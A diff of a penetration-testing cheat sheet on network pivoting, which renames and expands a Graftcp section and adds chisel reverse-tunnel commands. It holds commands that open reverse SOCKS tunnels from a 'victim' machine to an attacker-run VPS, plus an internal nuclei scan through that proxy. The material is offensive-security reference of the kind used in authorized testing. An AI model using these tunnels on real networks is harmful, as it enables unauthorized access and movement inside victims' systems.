@@ -8,7 +8,7 @@
   * [Local Port Forwarding](#local-port-forwarding)
   * [Remote Port Forwarding](#remote-port-forwarding)
 * [Proxychains](#proxychains)
-* [Graphtcp](#graphtcp)
+* [Graftcp](#graftcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
 * [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
 * [Metasploit](#metasploit)
@@ -82,16 +82,42 @@ socks4 localhost 8080
 
 Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
-## Graphtcp
+## Graftcp
 
-Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+> A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.
 
-```powershell
-git clone https://github.com/hmgle/graftcp.git
-cd graftcp && make
-graftcp-local/graftcp-local
-./graftcp chromium-browser
+:warning: Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+
+```ps1
+# https://github.com/hmgle/graftcp
+
+# Create a SOCKS5, using Chisel or another tool and forward it through SSH
+(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
+(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
+(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 
+
+# Run graftcp and specify the SOCKS5
+(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
+(attacker) $ graftcp ./nuclei -u http://172.16.1.24
 ```
+
+Simple configuration file for graftcp
+
+```py
+# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf
+## Listen address (default ":2233")
+listen = :2233
+loglevel = 1
+
+## SOCKS5 address (default "127.0.0.1:1080")
+socks5 = 127.0.0.1:1080
+# socks5_username = SOCKS5USERNAME
+# socks5_password = SOCKS5PASSWORD
+
+## Set the mode for select a proxy (default "auto")
+select_proxy_mode = auto
+```
+
 
 ## Web SOCKS - reGeorg
 
@@ -206,8 +232,11 @@ $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 go get -v github.com/jpillora/chisel
 
 # forward port 389 and 88 to hacker computer
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+
+# SOCKS
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
 ```
 
 ### SharpChisel
